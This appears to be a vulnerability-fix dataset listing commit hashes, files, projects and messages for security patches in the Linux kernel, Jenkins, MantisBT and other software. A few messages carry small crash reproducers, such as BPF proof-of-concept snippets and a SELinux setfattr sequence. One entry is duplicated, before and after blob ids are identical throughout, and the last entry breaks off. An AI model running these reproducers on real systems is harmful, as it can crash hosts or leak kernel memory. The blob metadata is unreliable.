Patch sérurity

======================================================================
Commit With Fix: 
    fc9bbcd25b0b4f09bbd6339f710ad24c129d5d7c
File(s) In Commit: 
    rply/parsergenerator.py
Blob(s) In Commit: 
    bc81f190454fb9084720b3ffd98cb601dfae71a6
Blob(s) Before Fix: 
    bc81f190454fb9084720b3ffd98cb601dfae71a6
Projects:
    djc_rply
Commit Message for fc9bbcd25b0b4f09bbd6339f710ad24c129d5d7c:
The parser cache is now always handled in a per-user fashion.\n\nThis avoids issues with people providing malciious caches in a multi-user system.\n\nOriginally reported as: http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=735263\n\nA CVE number has been requested

======================================================================
Commit With Fix: 
    00b4c17088fa56594d85fe46b6c6057bb3421102
File(s) In Commit: 
    api/soap/mc_file_api.php
Blob(s) In Commit: 
    b290c4de0ffc4dd3a99ed2a920945673f2091de0
Blob(s) Before Fix: 
    b290c4de0ffc4dd3a99ed2a920945673f2091de0
Projects:
    01-Scripts_mantisbt
Commit Message for 00b4c17088fa56594d85fe46b6c6057bb3421102:
Fix CVE-2014-1608: mc_issue_attachment_get SQL injection\n\nUse of db_query() instead of db_query_bound() allowed SQL injection attacks due to unsanitized use of parameters within the query when using the SOAP API mc_issue_attachment_get.\n\nThis issue was reported by e-mail by Andrea Barisani from oCERT, on behalf of Martin Herfurt <martin.herfurt@nruns.com>, a security researcher at n.runs professionals GmbH, who discovered the issue during an audit at a customer's site.\n\nFixes #16879\n\nSigned-off-by: Damien Regad <dregad@mantisbt.org>\n\nConflicts: 	api/soap/mc_file_api.php

======================================================================
Commit With Fix: 
    2690d97ade05c5325cbf7c72b94b90d265659886
File(s) In Commit: 
    net/netfilter/nf_nat_irc.c
Blob(s) In Commit: 
    1fb2258c35357c8c6f5072ae6593de2d53ab9f03
Blob(s) Before Fix: 
    1fb2258c35357c8c6f5072ae6593de2d53ab9f03
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2690d97ade05c5325cbf7c72b94b90d265659886:
netfilter: nf_nat: fix access to uninitialized buffer in IRC NAT helper\n\nCommit 5901b6be885e attempted to introduce IPv6 support into IRC NAT helper. By doing so, the following code seemed to be removed by accident:\n\n  ip = ntohl(exp->master->tuplehash[IP_CT_DIR_REPLY].tuple.dst.u3.ip)    sprintf(buffer, "%u %u", ip, port)    pr_debug("nf_nat_irc: inserting '%s' == %pI4, port %u\n", buffer, &ip, port) \n\nThis leads to the fact that buffer[] was left uninitialized and contained some stack value. When we call nf_nat_mangle_tcp_packet(), we call strlen(buffer) on excatly this uninitialized buffer. If we are unlucky and the skb has enough tailroom, we overwrite resp. leak contents with values that sit on our stack into the packet and send that out to the receiver.\n\nSince the rather informal DCC spec [1] does not seem to specify IPv6 support right now, we log such occurences so that admins can act accordingly, and drop the packet. I've looked into XChat source, and IPv6 is not supported there: addresses are in u32 and print via %u format string.\n\nTherefore, restore old behaviour as in IPv4, use snprintf(). The IRC helper does not support IPv6 by now. By this, we can safely use strlen(buffer) in nf_nat_mangle_tcp_packet() and prevent a buffer overflow. Also simplify some code as we now have ct variable anyway.\n\n  [1] http://www.irchelp.org/irchelp/rfc/ctcpspec.html\n\nFixes: 5901b6be885e ("netfilter: nf_nat: support IPv6 in IRC NAT helper") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Harald Welte <laforge@gnumonks.org> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    ef87dbe7614341c2e7bfe8d32fcb7028cc97442c
File(s) In Commit: 
    drivers/block/floppy.c
Blob(s) In Commit: 
    12251a688871976cbcb5fc17a61b3c199fcfa787
Blob(s) Before Fix: 
    12251a688871976cbcb5fc17a61b3c199fcfa787
Projects:
    0-T-0_ps4-linux
Commit Message for ef87dbe7614341c2e7bfe8d32fcb7028cc97442c:
floppy: ignore kernel-only members in FDRAWCMD ioctl input\n\nAlways clear out these floppy_raw_cmd struct members after copying the entire structure from userspace so that the in-kernel version is always valid and never left in an interdeterminate state.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    2145e15e0557a01b9195d1c7199a1b92cb9be81f
File(s) In Commit: 
    drivers/block/floppy.c
Blob(s) In Commit: 
    fa9bb742df6e0becfa8bca52576f17b5bdafe2bf
Blob(s) Before Fix: 
    fa9bb742df6e0becfa8bca52576f17b5bdafe2bf
Projects:
    0-T-0_ps4-linux
Commit Message for 2145e15e0557a01b9195d1c7199a1b92cb9be81f:
floppy: don't write kernel-only members to FDRAWCMD ioctl output\n\nDo not leak kernel-only floppy_raw_cmd structure members to userspace. This includes the linked-list pointer and the pointer to the allocated DMA space.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e6a623460e5fc960ac3ee9f946d3106233fd28d8
File(s) In Commit: 
    drivers/media/media-device.c
Blob(s) In Commit: 
    703560fa5e73b456cbc0951ccb61957bdfecebac
Blob(s) Before Fix: 
    703560fa5e73b456cbc0951ccb61957bdfecebac
Projects:
    0-T-0_ps4-linux
Commit Message for e6a623460e5fc960ac3ee9f946d3106233fd28d8:
[media] media-device: fix infoleak in ioctl media_enum_entities()\n\nThis fixes CVE-2014-1739.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es> Acked-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com> Cc: stable@vger.kernel.org Signed-off-by: Mauro Carvalho Chehab <m.chehab@samsung.com>

======================================================================
Commit With Fix: 
    2172fa709ab32ca60e86179dc67d0857be8e2c98
File(s) In Commit: 
    security/selinux/ss/services.c
Blob(s) In Commit: 
    f1e46d776544fc4694a78ad436f5d9b06ece5589
Blob(s) Before Fix: 
    f1e46d776544fc4694a78ad436f5d9b06ece5589
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2172fa709ab32ca60e86179dc67d0857be8e2c98:
SELinux:  Fix kernel BUG on empty security contexts.\n\nSetting an empty security context (length=0) on a file will lead to incorrectly dereferencing the type and other fields of the security context structure, yielding a kernel BUG. As a zero-length security context is never valid, just reject all such security contexts whether coming from userspace via setxattr or coming from the filesystem upon a getxattr request by SELinux.\n\nSetting a security context value (empty or otherwise) unknown to SELinux in the first place is only possible for a root process (CAP_MAC_ADMIN), and, if running SELinux in enforcing mode, only if the corresponding SELinux mac_admin permission is also granted to the domain by policy.  In Fedora policies, this is only allowed for specific domains such as livecd for setting down security contexts that are not defined in the build host policy.\n\nReproducer: su setenforce 0 touch foo setfattr -n security.selinux foo\n\nCaveat: Relabeling or removing foo after doing the above may not be possible without booting with SELinux disabled.  Any subsequent access to foo after doing the above will also trigger the BUG.\n\nBUG output from Matthew Thode: [  473.893141] ------------[ cut here ]------------ [  473.962110] kernel BUG at security/selinux/ss/services.c:654! [  473.995314] invalid opcode: 0000 [#6] SMP [  474.027196] Modules linked in: [  474.058118] CPU: 0 PID: 8138 Comm: ls Tainted: G      D   I 3.13.0-grsec #1 [  474.116637] Hardware name: Supermicro X8ST3/X8ST3, BIOS 2.0 07/29/10 [  474.149768] task: ffff8805f50cd010 ti: ffff8805f50cd488 task.ti: ffff8805f50cd488 [  474.183707] RIP: 0010:[<ffffffff814681c7>]  [<ffffffff814681c7>] context_struct_compute_av+0xce/0x308 [  474.219954] RSP: 0018:ffff8805c0ac3c38  EFLAGS: 00010246 [  474.252253] RAX: 0000000000000000 RBX: ffff8805c0ac3d94 RCX: 0000000000000100 [  474.287018] RDX: ffff8805e8aac000 RSI: 00000000ffffffff RDI: ffff8805e8aaa000 [  474.321199] RBP: ffff8805c0ac3cb8 R08: 0000000000000010 R09: 0000000000000006 [  474.357446] R10: 0000000000000000 R11: ffff8805c567a000 R12: 0000000000000006 [  474.419191] R13: ffff8805c2b74e88 R14: 00000000000001da R15: 0000000000000000 [  474.453816] FS:  00007f2e75220800(0000) GS:ffff88061fc00000(0000) knlGS:0000000000000000 [  474.489254] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  474.522215] CR2: 00007f2e74716090 CR3: 00000005c085e000 CR4: 00000000000207f0 [  474.556058] Stack: [  474.584325]  ffff8805c0ac3c98 ffffffff811b549b ffff8805c0ac3c98 ffff8805f1190a40 [  474.618913]  ffff8805a6202f08 ffff8805c2b74e88 00068800d0464990 ffff8805e8aac860 [  474.653955]  ffff8805c0ac3cb8 000700068113833a ffff880606c75060 ffff8805c0ac3d94 [  474.690461] Call Trace: [  474.723779]  [<ffffffff811b549b>] ? lookup_fast+0x1cd/0x22a [  474.778049]  [<ffffffff81468824>] security_compute_av+0xf4/0x20b [  474.811398]  [<ffffffff8196f419>] avc_compute_av+0x2a/0x179 [  474.843813]  [<ffffffff8145727b>] avc_has_perm+0x45/0xf4 [  474.875694]  [<ffffffff81457d0e>] inode_has_perm+0x2a/0x31 [  474.907370]  [<ffffffff81457e76>] selinux_inode_getattr+0x3c/0x3e [  474.938726]  [<ffffffff81455cf6>] security_inode_getattr+0x1b/0x22 [  474.970036]  [<ffffffff811b057d>] vfs_getattr+0x19/0x2d [  475.000618]  [<ffffffff811b05e5>] vfs_fstatat+0x54/0x91 [  475.030402]  [<ffffffff811b063b>] vfs_lstat+0x19/0x1b [  475.061097]  [<ffffffff811b077e>] SyS_newlstat+0x15/0x30 [  475.094595]  [<ffffffff8113c5c1>] ? __audit_syscall_entry+0xa1/0xc3 [  475.148405]  [<ffffffff8197791e>] system_call_fastpath+0x16/0x1b [  475.179201] Code: 00 48 85 c0 48 89 45 b8 75 02 0f 0b 48 8b 45 a0 48 8b 3d 45 d0 b6 00 8b 40 08 89 c6 ff ce e8 d1 b0 06 00 48 85 c0 49 89 c7 75 02 <0f> 0b 48 8b 45 b8 4c 8b 28 eb 1e 49 8d 7d 08 be 80 01 00 00 e8 [  475.255884] RIP  [<ffffffff814681c7>] context_struct_compute_av+0xce/0x308 [  475.296120]  RSP <ffff8805c0ac3c38> [  475.328734] ---[ end trace f076482e9d754adc ]---\n\nReported-by:  Matthew Thode <mthode@mthode.org> Signed-off-by: Stephen Smalley <sds@tycho.nsa.gov> Cc: stable@vger.kernel.org Signed-off-by: Paul Moore <pmoore@redhat.com>

======================================================================
Commit With Fix: 
    968d5d5f486820bfa30af046f063b9f23304e14a
File(s) In Commit: 
    import.php
Blob(s) In Commit: 
    85a78142add597f9178276b18e152cea9a6301c7
Blob(s) Before Fix: 
    85a78142add597f9178276b18e152cea9a6301c7
Projects:
    007durgesh219_phpmyadmin
Commit Message for 968d5d5f486820bfa30af046f063b9f23304e14a:
Sanitize filename in import message\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    263b4509ec4d47e0da3e753f85a39ea12d1eff24
File(s) In Commit: 
    fs/nfs/write.c
Blob(s) In Commit: 
    a44a87268a6ef640c454600873489cc4e4e1e058
Blob(s) Before Fix: 
    a44a87268a6ef640c454600873489cc4e4e1e058
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 263b4509ec4d47e0da3e753f85a39ea12d1eff24:
nfs: always make sure page is up-to-date before extending a write to cover the entire page\n\nWe should always make sure the cached page is up-to-date when we're determining whether we can extend a write to cover the full page -- even if we've received a write delegation from the server.\n\nCommit c7559663 added logic to skip this check if we have a write delegation, which can lead to data corruption such as the following scenario if client B receives a write delegation from the NFS server:\n\nClient A:     # echo 123456789 > /mnt/file\n\nClient B:     # echo abcdefghi >> /mnt/file     # cat /mnt/file     0�D0�abcdefghi\n\nJust because we hold a write delegation doesn't mean that we've read in the entire page contents.\n\nCc: <stable@vger.kernel.org> # v3.11+ Signed-off-by: Scott Mayhew <smayhew@redhat.com> Signed-off-by: Trond Myklebust <trond.myklebust@primarydata.com>

======================================================================
Commit With Fix: 
    8d7f6690cedb83456edd41c9bd583783f0703bf0
File(s) In Commit: 
    arch/s390/kernel/head64.S
Blob(s) In Commit: 
    d7c00507568a73e8f5acb45014f366154f839980
Blob(s) Before Fix: 
    d7c00507568a73e8f5acb45014f366154f839980
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8d7f6690cedb83456edd41c9bd583783f0703bf0:
s390: fix kernel crash due to linkage stack instructions\n\nThe kernel currently crashes with a low-address-protection exception if a user space process executes an instruction that tries to use the linkage stack. Set the base-ASTE origin and the subspace-ASTE origin of the dispatchable-unit-control-table to point to a dummy ASTE. Set up control register 15 to point to an empty linkage stack with no room left.\n\nA user space process with a linkage stack instruction will still crash but with a different exception which is correctly translated to a segmentation fault instead of a kernel oops.\n\nSigned-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

======================================================================
Commit With Fix: 
    ad38d8480f20ce3cbf8fec3e2003bc83efda4f7d
File(s) In Commit: 
    core/src/main/java/hudson/cli/CreateJobCommand.java
Blob(s) In Commit: 
    02dd6ae55ebdf064d09f79e5b094a2192f2bf74c
Blob(s) Before Fix: 
    02dd6ae55ebdf064d09f79e5b094a2192f2bf74c
Projects:
    01user_jenkins
Commit Message for ad38d8480f20ce3cbf8fec3e2003bc83efda4f7d:
[FIXED SECURITY-108] Check job name created via CLI

======================================================================
Commit With Fix: 
    5548b5220cfd496831b5721124189ff18fbb12a3
File(s) In Commit: 
    core/src/main/java/jenkins/security/ApiTokenFilter.java
Blob(s) In Commit: 
    b1078e6240c6344d186feffd9a8f65a713f802fe
Blob(s) Before Fix: 
    b1078e6240c6344d186feffd9a8f65a713f802fe
Projects:
    01user_jenkins
Commit Message for 5548b5220cfd496831b5721124189ff18fbb12a3:
[FIXED SECURITY-89] When checking an API token, verify that the user actually exists.

======================================================================
Commit With Fix: 
    16931bd7bf7560e26ef98328b8e95e803d0e90f6
File(s) In Commit: 
    core/src/main/resources/lib/layout/layout.jelly
Blob(s) In Commit: 
    c31d4c2a31c7c22c23572f0dd9b4c98db065191c
Blob(s) Before Fix: 
    c31d4c2a31c7c22c23572f0dd9b4c98db065191c
Projects:
    01user_jenkins
Commit Message for 16931bd7bf7560e26ef98328b8e95e803d0e90f6:
[FIXED SECURITY-80] Add X-Frame-Options head to prevent clickjacking attacks

======================================================================
Commit With Fix: 
    fbf96734470caba9364f04e0b77b0bae7293a1ec
File(s) In Commit: 
    core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java
Blob(s) In Commit: 
    de7863ecf5e8c3845af5d5d5057104249654e6a7
Blob(s) Before Fix: 
    de7863ecf5e8c3845af5d5d5057104249654e6a7
Projects:
    01user_jenkins
Commit Message for fbf96734470caba9364f04e0b77b0bae7293a1ec:
[FIXED SECURITY-79] Prevent (private security realm) usernames from being guessed.

======================================================================
Commit With Fix: 
    8ac74c350779921598f9d5edfed39dd35de8842a
File(s) In Commit: 
    core/src/main/java/hudson/security/AuthenticationProcessingFilter2.java
Blob(s) In Commit: 
    1819c771f475903678306c104b1a6167288f59e5
Blob(s) Before Fix: 
    1819c771f475903678306c104b1a6167288f59e5
Projects:
    01user_jenkins
Commit Message for 8ac74c350779921598f9d5edfed39dd35de8842a:
[FIXED SECURITY-75] Invalidate session after login to avoid session fixation

======================================================================
Commit With Fix: 
    5d57c855f3147bfc5e7fda9252317b428a700014
File(s) In Commit: 
    core/src/main/java/hudson/model/Cause.java
Blob(s) In Commit: 
    52b2eeffb13db8afb19cf1bf125e39af39bbf294
Blob(s) Before Fix: 
    52b2eeffb13db8afb19cf1bf125e39af39bbf294
Projects:
    01user_jenkins
Commit Message for 5d57c855f3147bfc5e7fda9252317b428a700014:
[FIXED SECURITY-74] Apply markup formatter to remote cause note.

======================================================================
Commit With Fix: 
    0530a6645aac10fec005614211660e98db44b5eb
File(s) In Commit: 
    core/src/main/java/hudson/util/RemotingDiagnostics.java
Blob(s) In Commit: 
    8f014bbcf830319e1e7db2d1f7e0437133569068
Blob(s) Before Fix: 
    8f014bbcf830319e1e7db2d1f7e0437133569068
Projects:
    01user_jenkins
Commit Message for 0530a6645aac10fec005614211660e98db44b5eb:
[FIXED SECURITY-73] Require RUN_SCRIPTS for /heapDump.

======================================================================
Commit With Fix: 
    506a44194a9016406c752ad8e010c01aeffc18cc
File(s) In Commit: 
    hphp/util/light-process.cpp
Blob(s) In Commit: 
    16c834acae4c2d3189b26ba89335f18a8d1b2893
Blob(s) Before Fix: 
    16c834acae4c2d3189b26ba89335f18a8d1b2893
Projects:
    10000TB_hhvm
Commit Message for 506a44194a9016406c752ad8e010c01aeffc18cc:
Fix escaping in LightProcess protocol\n\nThe LightProcess mechanism sends newline terminated commands over a pipe, but didn't escape newlines contained in the payload.\n\nReviewed By: otto\n\nDifferential Revision: D1184482

======================================================================
Commit With Fix: 
    447558595a3650db2886cd2f416ad0beba965801
File(s) In Commit: 
    src/softmagic.c
Blob(s) In Commit: 
    ac9c18bdcabf40af9f84bd6af05d80c491739e7a
Blob(s) Before Fix: 
    ac9c18bdcabf40af9f84bd6af05d80c491739e7a
Projects:
    5hadowblad3_file
Commit Message for 447558595a3650db2886cd2f416ad0beba965801:
PR/313: Aaron Reffett: Check properly for exceeding the offset.

======================================================================
Commit With Fix: 
    b22f5126a24b3b2f15448c3f2a254fc10cbc2b92
File(s) In Commit: 
    net/netfilter/nf_conntrack_proto_dccp.c
Blob(s) In Commit: 
    cb372f96f10dc3c2f60064e49b86d35c76c6cd1b
Blob(s) Before Fix: 
    cb372f96f10dc3c2f60064e49b86d35c76c6cd1b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b22f5126a24b3b2f15448c3f2a254fc10cbc2b92:
netfilter: nf_conntrack_dccp: fix skb_header_pointer API usages\n\nSome occurences in the netfilter tree use skb_header_pointer() in the following way ...\n\n  struct dccp_hdr _dh, *dh    ...   skb_header_pointer(skb, dataoff, sizeof(_dh), &dh) \n\n... where dh itself is a pointer that is being passed as the copy buffer. Instead, we need to use &_dh as the forth argument so that we're copying the data into an actual buffer that sits on the stack.\n\nCurrently, we probably could overwrite memory on the stack (e.g. with a possibly mal-formed DCCP packet), but unintentionally, as we only want the buffer to be placed into _dh variable.\n\nFixes: 2bc780499aa3 ("[NETFILTER]: nf_conntrack: add DCCP protocol support") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    d11811baccf265ff567dddca03cac70b65838a4f
File(s) In Commit: 
    settings/site.ini.append.php
Blob(s) In Commit: 
    e7d1cec7e674b8075a0c1ed88276c92c00776a95
Blob(s) Before Fix: 
    e7d1cec7e674b8075a0c1ed88276c92c00776a95
Projects:
    myxt_bccie
Commit Message for d11811baccf265ff567dddca03cac70b65838a4f:
Updated: Commented out role policy override settings for greater default security of cie information

======================================================================
Commit With Fix: 
    d13682b7e27d14a6323c441426f3dde1cd86c751
File(s) In Commit: 
    www/make_subset.php
Blob(s) In Commit: 
    812cb5e77cbe9d86f796e05fec81a0232be7eca1
Blob(s) Before Fix: 
    812cb5e77cbe9d86f796e05fec81a0232be7eca1
Projects:
    1987santiago_php-font-lib
Commit Message for d13682b7e27d14a6323c441426f3dde1cd86c751:
Fix a possible XSS

======================================================================
Commit With Fix: 
    21f8aaee0c62708654988ce092838aa7df4d25d8
File(s) In Commit: 
    drivers/net/wireless/ath/ath9k/xmit.c
Blob(s) In Commit: 
    4f4ce83f7ab4afd69fb4ed4ae937953711d3343a
Blob(s) Before Fix: 
    4f4ce83f7ab4afd69fb4ed4ae937953711d3343a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21f8aaee0c62708654988ce092838aa7df4d25d8:
ath9k: protect tid->sched check\n\nWe check tid->sched without a lock taken on ath_tx_aggr_sleep(). That is race condition which can result of doing list_del(&tid->list) twice (second time with poisoned list node) and cause crash like shown below:\n\n[424271.637220] BUG: unable to handle kernel paging request at 00100104 [424271.637328] IP: [<f90fc072>] ath_tx_aggr_sleep+0x62/0xe0 [ath9k] ... [424271.639953] Call Trace: [424271.639998]  [<f90f6900>] ? ath9k_get_survey+0x110/0x110 [ath9k] [424271.640083]  [<f90f6942>] ath9k_sta_notify+0x42/0x50 [ath9k] [424271.640177]  [<f809cfef>] sta_ps_start+0x8f/0x1c0 [mac80211] [424271.640258]  [<c10f730e>] ? free_compound_page+0x2e/0x40 [424271.640346]  [<f809e915>] ieee80211_rx_handlers+0x9d5/0x2340 [mac80211] [424271.640437]  [<c112f048>] ? kmem_cache_free+0x1d8/0x1f0 [424271.640510]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640578]  [<c10fc23c>] ? put_page+0x2c/0x40 [424271.640640]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640706]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640787]  [<f809dde3>] ? ieee80211_rx_handlers_result+0x73/0x1d0 [mac80211] [424271.640897]  [<f80a07a0>] ieee80211_prepare_and_rx_handle+0x520/0xad0 [mac80211] [424271.641009]  [<f809e22d>] ? ieee80211_rx_handlers+0x2ed/0x2340 [mac80211] [424271.641104]  [<c13846ce>] ? ip_output+0x7e/0xd0 [424271.641182]  [<f80a1057>] ieee80211_rx+0x307/0x7c0 [mac80211] [424271.641266]  [<f90fa6ee>] ath_rx_tasklet+0x88e/0xf70 [ath9k] [424271.641358]  [<f80a0f2c>] ? ieee80211_rx+0x1dc/0x7c0 [mac80211] [424271.641445]  [<f90f82db>] ath9k_tasklet+0xcb/0x130 [ath9k]\n\nBug report: https://bugzilla.kernel.org/show_bug.cgi?id=70551\n\nReported-and-tested-by: Max Sydorenko <maxim.stargazer@gmail.com> Cc: stable@vger.kernel.org Signed-off-by: Stanislaw Gruszka <sgruszka@redhat.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    621b5060e823301d0cba4cb52a7ee3491922d291
File(s) In Commit: 
    arch/powerpc/kernel/process.c
Blob(s) In Commit: 
    af064d28b36524c5ce9c8fc982a58eec65ebbfc7
Blob(s) Before Fix: 
    af064d28b36524c5ce9c8fc982a58eec65ebbfc7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 621b5060e823301d0cba4cb52a7ee3491922d291:
powerpc/tm: Fix crash when forking inside a transaction\n\nWhen we fork/clone we currently don't copy any of the TM state to the new thread.  This results in a TM bad thing (program check) when the new process is switched in as the kernel does a tmrechkpt with TEXASR FS not set.  Also, since R1 is from userspace, we trigger the bad kernel stack pointer detection.  So we end up with something like this:\n\n   Bad kernel stack pointer 0 at c0000000000404fc    cpu 0x2: Vector: 700 (Program Check) at [c00000003ffefd40]        pc: c0000000000404fc: restore_gprs+0xc0/0x148        lr: 0000000000000000        sp: 0       msr: 9000000100201030      current = 0xc000001dd1417c30      paca    = 0xc00000000fe00800   softe: 0        irq_happened: 0x01        pid   = 0, comm = swapper/2    WARNING: exception is not recoverable, can't continue\n\nThe below fixes this by flushing the TM state before we copy the task_struct to the clone.  To do this we go through the tmreclaim patch, which removes the checkpointed registers from the CPU and transitions the CPU out of TM suspend mode.  Hence we need to call tmrechkpt after to restore the checkpointed state and the TM mode for the current task.\n\nTo make this fail from userspace is simply: 	tbegin 	li	r0, 2 	sc 	<boom>\n\nKudos to Adhemerval Zanella Neto for finding this.\n\nSigned-off-by: Michael Neuling <mikey@neuling.org> cc: Adhemerval Zanella Neto <azanella@br.ibm.com> cc: stable@vger.kernel.org Signed-off-by: Benjamin Herrenschmidt <benh@kernel.crashing.org>

======================================================================
Commit With Fix: 
    a03ffcf873fe0f2565386ca8ef832144c42e67fa
File(s) In Commit: 
    arch/x86/net/bpf_jit_comp.c
Blob(s) In Commit: 
    7b65f752c5f8fd79af2c6b4afb342988bdd8d56c
Blob(s) Before Fix: 
    7b65f752c5f8fd79af2c6b4afb342988bdd8d56c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a03ffcf873fe0f2565386ca8ef832144c42e67fa:
net: bpf_jit: fix an off-one bug in x86_64 cond jump target\n\nx86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6 bytes.\n\nIn case a conditional jump is followed by a long jump, conditional jump target is one byte past the start of target instruction.\n\nSigned-off-by: Markus Kötter <nepenthesdev@gmail.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    05ab8f2647e4221cbdb3856dd7d32bd5407316b3
File(s) In Commit: 
    net/core/filter.c
Blob(s) In Commit: 
    0e0856f5d708457b6de9a71df82ff2547f97c155
Blob(s) Before Fix: 
    0e0856f5d708457b6de9a71df82ff2547f97c155
Projects:
    0-T-0_ps4-linux
Commit Message for 05ab8f2647e4221cbdb3856dd7d32bd5407316b3:
filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check for a minimal message length before testing the supplied offset to be within the bounds of the message. This allows the subtraction of the nla header to underflow and therefore -- as the data type is unsigned -- allowing far to big offset and length values for the search of the netlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is also wrong. It has the minuend and subtrahend mixed up, therefore calculates a huge length value, allowing to overrun the end of the message while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to a UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--  | ld	#0x87654321  | ldx	#42  | ld	#nla  | ret	a  `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--  | ld	#0x87654321  | ldx	#42  | ld	#nlan  | ret	a  `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--  |   (needs a fake netlink header at offset 0)  | ld	#0  | ldx	#42  | ld	#nlan  | ret	a  `---\n\nFix the first issue by ensuring the message length fulfills the minimal size constrains of a nla header. Fix the second bug by getting the math for the remainder calculation right.\n\nFixes: 4738c1db15 ("[SKFILTER]: Add SKF_ADF_NLATTR instruction") Fixes: d214c7537b ("filter: add SKF_AD_NLATTR_NEST to look for nested..") Cc: Patrick McHardy <kaber@trash.net> Cc: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    05ab8f2647e4221cbdb3856dd7d32bd5407316b3
File(s) In Commit: 
    net/core/filter.c
Blob(s) In Commit: 
    0e0856f5d708457b6de9a71df82ff2547f97c155
Blob(s) Before Fix: 
    0e0856f5d708457b6de9a71df82ff2547f97c155
Projects:
    0-T-0_ps4-linux
Commit Message for 05ab8f2647e4221cbdb3856dd7d32bd5407316b3:
filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check for a minimal message length before testing the supplied offset to be within the bounds of the message. This allows the subtraction of the nla header to underflow and therefore -- as the data type is unsigned -- allowing far to big offset and length values for the search of the netlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is also wrong. It has the minuend and subtrahend mixed up, therefore calculates a huge length value, allowing to overrun the end of the message while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to a UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--  | ld	#0x87654321  | ldx	#42  | ld	#nla  | ret	a  `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--  | ld	#0x87654321  | ldx	#42  | ld	#nlan  | ret	a  `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--  |   (needs a fake netlink header at offset 0)  | ld	#0  | ldx	#42  | ld	#nlan  | ret	a  `---\n\nFix the first issue by ensuring the message length fulfills the minimal size constrains of a nla header. Fix the second bug by getting the math for the remainder calculation right.\n\nFixes: 4738c1db15 ("[SKFILTER]: Add SKF_ADF_NLATTR instruction") Fixes: d214c7537b ("filter: add SKF_AD_NLATTR_NEST to look for nested..") Cc: Patrick McHardy <kaber@trash.net> Cc: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    e9bedb644d106a043e33e1058bedd1c2c0b2e2e0
File(s) In Commit: 
    libahttp/err.C
Blob(s) In Commit: 
    b6101f027746ac6f6d252f58f5609138db56bd66
Blob(s) Before Fix: 
    b6101f027746ac6f6d252f58f5609138db56bd66
Projects:
    s4y_okws
Commit Message for e9bedb644d106a043e33e1058bedd1c2c0b2e2e0:
Escape error page content\n\nCredit to Kenneth F. Belva (https://twitter.com/infosecmaverick) https://hackerone.com/reports/3317

======================================================================
Commit With Fix: 
    e9c243a5a6de0be8e584c604d353412584b592f8
File(s) In Commit: 
    kernel/futex.c
Blob(s) In Commit: 
    663ea2b84a3830ec9c772f78ec7eaa23504bfcc5
Blob(s) Before Fix: 
    663ea2b84a3830ec9c772f78ec7eaa23504bfcc5
Projects:
    0-T-0_ps4-linux
Commit Message for e9c243a5a6de0be8e584c604d353412584b592f8:
